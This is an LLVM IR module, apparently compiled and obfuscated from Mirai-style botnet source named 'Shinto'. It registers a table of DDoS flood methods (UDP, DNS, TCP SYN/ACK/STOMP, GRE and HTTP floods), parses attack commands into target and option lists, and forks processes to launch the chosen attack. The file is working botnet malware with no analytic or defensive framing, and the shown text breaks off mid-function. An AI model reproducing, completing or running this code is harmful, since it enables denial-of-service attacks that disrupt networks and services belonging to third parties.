; ModuleID = 'host/ir_sub/Shinto.d.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [8 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table = common global [63 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 1043935, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  call void @add_attack(i8 zeroext 0, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_generic)
  call void @add_attack(i8 zeroext 1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_vse)
  call void @add_attack(i8 zeroext 2, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_dns)
  call void @add_attack(i8 zeroext 8, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_plain)
  call void @add_attack(i8 zeroext 3, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_syn)
  call void @add_attack(i8 zeroext 4, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_ack)
  call void @add_attack(i8 zeroext 5, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_stomp)
  call void @add_attack(i8 zeroext 6, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_ip)
  call void @add_attack(i8 zeroext 7, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_eth)
  call void @add_attack(i8 zeroext 9, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* bitcast (void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_app_http to void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*))
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = sub i32 %17, 2091875
  %19 = add i32 %18, 1
  %20 = add i32 %19, 2091875
  %21 = add nsw i32 %17, 1
  %22 = sext i32 %20 to i64
  %23 = mul i64 %22, 8
  %24 = call i8* @realloc(i8* %15, i64 %23) #6
  %25 = bitcast i8* %24 to %struct.attack_method**
  store %struct.attack_method** %25, %struct.attack_method*** @methods, align 8
  %26 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %27 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %28 = load i8, i8* @methods_len, align 1
  %29 = add i8 %28, -28
  %30 = add i8 %29, 1
  %31 = sub i8 %30, -28
  %32 = add i8 %28, 1
  store i8 %31, i8* @methods_len, align 1
  %33 = zext i8 %28 to i64
  %34 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %27, i64 %33
  store %struct.attack_method* %26, %struct.attack_method** %34, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %2
  br label %250

; <label>:17:                                     ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 %20) #7
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 0, 4
  %27 = add i64 %25, %26
  %28 = sub i64 %25, 4
  %29 = trunc i64 %27 to i32
  store i32 %29, i32* %4, align 4
  %30 = load i32, i32* %4, align 4
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %32, label %33

; <label>:32:                                     ; preds = %17
  br label %250

; <label>:33:                                     ; preds = %17
  %34 = load i8*, i8** %3, align 8
  %35 = getelementptr inbounds i8, i8* %34, i32 1
  store i8* %35, i8** %3, align 8
  %36 = load i8, i8* %34, align 1
  store i8 %36, i8* %7, align 1
  %37 = load i32, i32* %4, align 4
  %38 = sext i32 %37 to i64
  %39 = sub i64 %38, 7951393181939956783
  %40 = sub i64 %39, 1
  %41 = add i64 %40, 7951393181939956783
  %42 = sub i64 %38, 1
  %43 = trunc i64 %41 to i32
  store i32 %43, i32* %4, align 4
  %44 = load i32, i32* %4, align 4
  %45 = icmp eq i32 %44, 0
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %33
  br label %250

; <label>:47:                                     ; preds = %33
  %48 = load i8*, i8** %3, align 8
  %49 = getelementptr inbounds i8, i8* %48, i32 1
  store i8* %49, i8** %3, align 8
  %50 = load i8, i8* %48, align 1
  store i8 %50, i8* %8, align 1
  %51 = load i32, i32* %4, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 %52, 6837748600025737278
  %54 = sub i64 %53, 1
  %55 = add i64 %54, 6837748600025737278
  %56 = sub i64 %52, 1
  %57 = trunc i64 %55 to i32
  store i32 %57, i32* %4, align 4
  %58 = load i8, i8* %8, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %47
  br label %250

; <label>:62:                                     ; preds = %47
  %63 = load i32, i32* %4, align 4
  %64 = sext i32 %63 to i64
  %65 = load i8, i8* %8, align 1
  %66 = zext i8 %65 to i64
  %67 = mul i64 5, %66
  %68 = icmp ult i64 %64, %67
  br i1 %68, label %69, label %70

; <label>:69:                                     ; preds = %62
  br label %250

; <label>:70:                                     ; preds = %62
  %71 = load i8, i8* %8, align 1
  %72 = zext i8 %71 to i64
  %73 = call noalias i8* @calloc(i64 %72, i64 24) #6
  %74 = bitcast i8* %73 to %struct.attack_target*
  store %struct.attack_target* %74, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %75

; <label>:75:                                     ; preds = %124, %70
  %76 = load i32, i32* %5, align 4
  %77 = load i8, i8* %8, align 1
  %78 = zext i8 %77 to i32
  %79 = icmp slt i32 %76, %78
  br i1 %79, label %80, label %131

; <label>:80:                                     ; preds = %75
  %81 = load i8*, i8** %3, align 8
  %82 = bitcast i8* %81 to i32*
  %83 = load i32, i32* %82, align 4
  %84 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %85 = load i32, i32* %5, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 1
  store i32 %83, i32* %88, align 4
  %89 = load i8*, i8** %3, align 8
  %90 = getelementptr inbounds i8, i8* %89, i64 4
  store i8* %90, i8** %3, align 8
  %91 = load i8*, i8** %3, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 1
  store i8* %92, i8** %3, align 8
  %93 = load i8, i8* %91, align 1
  %94 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %95 = load i32, i32* %5, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %94, i64 %96
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %97, i32 0, i32 2
  store i8 %93, i8* %98, align 4
  %99 = load i32, i32* %4, align 4
  %100 = sext i32 %99 to i64
  %101 = sub i64 0, 5
  %102 = add i64 %100, %101
  %103 = sub i64 %100, 5
  %104 = trunc i64 %102 to i32
  store i32 %104, i32* %4, align 4
  %105 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %106 = load i32, i32* %5, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %105, i64 %107
  %109 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %108, i32 0, i32 0
  %110 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %109, i32 0, i32 0
  store i16 2, i16* %110, align 4
  %111 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %112 = load i32, i32* %5, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %111, i64 %113
  %115 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %114, i32 0, i32 1
  %116 = load i32, i32* %115, align 4
  %117 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %118 = load i32, i32* %5, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 0
  %122 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %121, i32 0, i32 2
  %123 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %122, i32 0, i32 0
  store i32 %116, i32* %123, align 4
  br label %124

; <label>:124:                                    ; preds = %80
  %125 = load i32, i32* %5, align 4
  %126 = sub i32 0, %125
  %127 = sub i32 0, 1
  %128 = add i32 %126, %127
  %129 = sub i32 0, %128
  %130 = add nsw i32 %125, 1
  store i32 %129, i32* %5, align 4
  br label %75

; <label>:131:                                    ; preds = %75
  %132 = load i32, i32* %4, align 4
  %133 = sext i32 %132 to i64
  %134 = icmp ult i64 %133, 1
  br i1 %134, label %135, label %136

; <label>:135:                                    ; preds = %131
  br label %250

; <label>:136:                                    ; preds = %131
  %137 = load i8*, i8** %3, align 8
  %138 = getelementptr inbounds i8, i8* %137, i32 1
  store i8* %138, i8** %3, align 8
  %139 = load i8, i8* %137, align 1
  store i8 %139, i8* %9, align 1
  %140 = load i32, i32* %4, align 4
  %141 = sext i32 %140 to i64
  %142 = sub i64 0, 1
  %143 = add i64 %141, %142
  %144 = sub i64 %141, 1
  %145 = trunc i64 %143 to i32
  store i32 %145, i32* %4, align 4
  %146 = load i8, i8* %9, align 1
  %147 = zext i8 %146 to i32
  %148 = icmp sgt i32 %147, 0
  br i1 %148, label %149, label %242

; <label>:149:                                    ; preds = %136
  %150 = load i8, i8* %9, align 1
  %151 = zext i8 %150 to i64
  %152 = call noalias i8* @calloc(i64 %151, i64 16) #6
  %153 = bitcast i8* %152 to %struct.attack_option*
  store %struct.attack_option* %153, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %154

; <label>:154:                                    ; preds = %234, %149
  %155 = load i32, i32* %5, align 4
  %156 = load i8, i8* %9, align 1
  %157 = zext i8 %156 to i32
  %158 = icmp slt i32 %155, %157
  br i1 %158, label %159, label %241

; <label>:159:                                    ; preds = %154
  %160 = load i32, i32* %4, align 4
  %161 = sext i32 %160 to i64
  %162 = icmp ult i64 %161, 1
  br i1 %162, label %163, label %164

; <label>:163:                                    ; preds = %159
  br label %250

; <label>:164:                                    ; preds = %159
  %165 = load i8*, i8** %3, align 8
  %166 = getelementptr inbounds i8, i8* %165, i32 1
  store i8* %166, i8** %3, align 8
  %167 = load i8, i8* %165, align 1
  %168 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %169 = load i32, i32* %5, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %168, i64 %170
  %172 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %171, i32 0, i32 1
  store i8 %167, i8* %172, align 8
  %173 = load i32, i32* %4, align 4
  %174 = sext i32 %173 to i64
  %175 = sub i64 %174, 1667954628520522609
  %176 = sub i64 %175, 1
  %177 = add i64 %176, 1667954628520522609
  %178 = sub i64 %174, 1
  %179 = trunc i64 %177 to i32
  store i32 %179, i32* %4, align 4
  %180 = load i32, i32* %4, align 4
  %181 = sext i32 %180 to i64
  %182 = icmp ult i64 %181, 1
  br i1 %182, label %183, label %184

; <label>:183:                                    ; preds = %164
  br label %250

; <label>:184:                                    ; preds = %164
  %185 = load i8*, i8** %3, align 8
  %186 = getelementptr inbounds i8, i8* %185, i32 1
  store i8* %186, i8** %3, align 8
  %187 = load i8, i8* %185, align 1
  store i8 %187, i8* %12, align 1
  %188 = load i32, i32* %4, align 4
  %189 = sext i32 %188 to i64
  %190 = sub i64 0, 1
  %191 = add i64 %189, %190
  %192 = sub i64 %189, 1
  %193 = trunc i64 %191 to i32
  store i32 %193, i32* %4, align 4
  %194 = load i32, i32* %4, align 4
  %195 = load i8, i8* %12, align 1
  %196 = zext i8 %195 to i32
  %197 = icmp slt i32 %194, %196
  br i1 %197, label %198, label %199

; <label>:198:                                    ; preds = %184
  br label %250

; <label>:199:                                    ; preds = %184
  %200 = load i8, i8* %12, align 1
  %201 = zext i8 %200 to i32
  %202 = sub i32 0, %201
  %203 = sub i32 0, 1
  %204 = add i32 %202, %203
  %205 = sub i32 0, %204
  %206 = add nsw i32 %201, 1
  %207 = sext i32 %205 to i64
  %208 = call noalias i8* @calloc(i64 %207, i64 1) #6
  %209 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %210 = load i32, i32* %5, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %209, i64 %211
  %213 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %212, i32 0, i32 0
  store i8* %208, i8** %213, align 8
  %214 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %215 = load i32, i32* %5, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %217, i32 0, i32 0
  %219 = load i8*, i8** %218, align 8
  %220 = load i8*, i8** %3, align 8
  %221 = load i8, i8* %12, align 1
  %222 = zext i8 %221 to i32
  call void @util_memcpy(i8* %219, i8* %220, i32 %222)
  %223 = load i8, i8* %12, align 1
  %224 = zext i8 %223 to i32
  %225 = load i8*, i8** %3, align 8
  %226 = sext i32 %224 to i64
  %227 = getelementptr inbounds i8, i8* %225, i64 %226
  store i8* %227, i8** %3, align 8
  %228 = load i8, i8* %12, align 1
  %229 = zext i8 %228 to i32
  %230 = load i32, i32* %4, align 4
  %231 = sub i32 0, %229
  %232 = add i32 %230, %231
  %233 = sub nsw i32 %230, %229
  store i32 %232, i32* %4, align 4
  br label %234

; <label>:234:                                    ; preds = %199
  %235 = load i32, i32* %5, align 4
  %236 = sub i32 0, %235
  %237 = sub i32 0, 1
  %238 = add i32 %236, %237
  %239 = sub i32 0, %238
  %240 = add nsw i32 %235, 1
  store i32 %239, i32* %5, align 4
  br label %154

; <label>:241:                                    ; preds = %154
  br label %242

; <label>:242:                                    ; preds = %241, %136
  %243 = call i32* @__errno_location() #7
  store i32 0, i32* %243, align 4
  %244 = load i32, i32* %6, align 4
  %245 = load i8, i8* %7, align 1
  %246 = load i8, i8* %8, align 1
  %247 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %248 = load i8, i8* %9, align 1
  %249 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %244, i8 zeroext %245, i8 zeroext %246, %struct.attack_target* %247, i8 zeroext %248, %struct.attack_option* %249)
  br label %250

; <label>:250:                                    ; preds = %242, %198, %183, %163, %135, %69, %61, %46, %32, %16
  %251 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %252 = icmp ne %struct.attack_target* %251, null
  br i1 %252, label %253, label %256

; <label>:253:                                    ; preds = %250
  %254 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %255 = bitcast %struct.attack_target* %254 to i8*
  call void @free(i8* %255) #6
  br label %256

; <label>:256:                                    ; preds = %253, %250
  %257 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %258 = icmp ne %struct.attack_option* %257, null
  br i1 %258, label %259, label %263

; <label>:259:                                    ; preds = %256
  %260 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %261 = load i8, i8* %9, align 1
  %262 = zext i8 %261 to i32
  call void @free_opts(%struct.attack_option* %260, i32 %262)
  br label %263

; <label>:263:                                    ; preds = %259, %256
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %15 = call i32 @fork() #6
  store i32 %15, i32* %13, align 4
  %16 = load i32, i32* %13, align 4
  %17 = icmp sgt i32 %16, 0
  br i1 %17, label %21, label %18

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %13, align 4
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %18, %6
  ret void

; <label>:22:                                     ; preds = %18
  store i32 0, i32* %14, align 4
  store i32 0, i32* %14, align 4
  br label %23

; <label>:23:                                     ; preds = %54, %22
  %24 = load i32, i32* %14, align 4
  %25 = load i8, i8* @methods_len, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp slt i32 %24, %26
  br i1 %27, label %28, label %60

; <label>:28:                                     ; preds = %23
  %29 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %29, i64 %31
  %33 = load %struct.attack_method*, %struct.attack_method** %32, align 8
  %34 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %33, i32 0, i32 1
  %35 = load i8, i8* %34, align 8
  %36 = zext i8 %35 to i32
  %37 = load i8, i8* %8, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp eq i32 %36, %38
  br i1 %39, label %40, label %53

; <label>:40:                                     ; preds = %28
  %41 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %42 = load i32, i32* %14, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %41, i64 %43
  %45 = load %struct.attack_method*, %struct.attack_method** %44, align 8
  %46 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %45, i32 0, i32 0
  %47 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %46, align 8
  %48 = load i32, i32* %7, align 4
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %51 = load i8, i8* %11, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %47(i32 %48, i8 zeroext %49, %struct.attack_target* %50, i8 zeroext %51, %struct.attack_option* %52)
  br label %60

; <label>:53:                                     ; preds = %28
  br label %54

; <label>:54:                                     ; preds = %53
  %55 = load i32, i32* %14, align 4
  %56 = add i32 %55, 1864081988
  %57 = add i32 %56, 1
  %58 = sub i32 %57, 1864081988
  %59 = add nsw i32 %55, 1
  store i32 %58, i32* %14, align 4
  br label %23

; <label>:60:                                     ; preds = %40, %23
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %38

; <label>:9:                                      ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %30, %9
  %11 = load i32, i32* %5, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %11, %12
  br i1 %13, label %14, label %35

; <label>:14:                                     ; preds = %10
  %15 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %15, i64 %17
  %19 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %14
  %23 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %23, i64 %25
  %27 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  call void @free(i8* %28) #6
  br label %29

; <label>:29:                                     ; preds = %22, %14
  br label %30

; <label>:30:                                     ; preds = %29
  %31 = load i32, i32* %5, align 4
  %32 = sub i32 0, 1
  %33 = sub i32 %31, %32
  %34 = add nsw i32 %31, 1
  store i32 %33, i32* %5, align 4
  br label %10

; <label>:35:                                     ; preds = %10
  %36 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %37 = bitcast %struct.attack_option* %36 to i8*
  call void @free(i8* %37) #6
  br label %38

; <label>:38:                                     ; preds = %35, %8
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %40

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %42

; <label>:34:                                     ; preds = %16
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = sub i32 0, 1
  %38 = sub i32 %36, %37
  %39 = add nsw i32 %36, 1
  store i32 %38, i32* %10, align 4
  br label %11

; <label>:40:                                     ; preds = %11
  %41 = load i8*, i8** %9, align 8
  store i8* %41, i8** %5, align 8
  br label %42

; <label>:42:                                     ; preds = %40, %27
  %43 = load i8*, i8** %5, align 8
  ret i8* %43
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
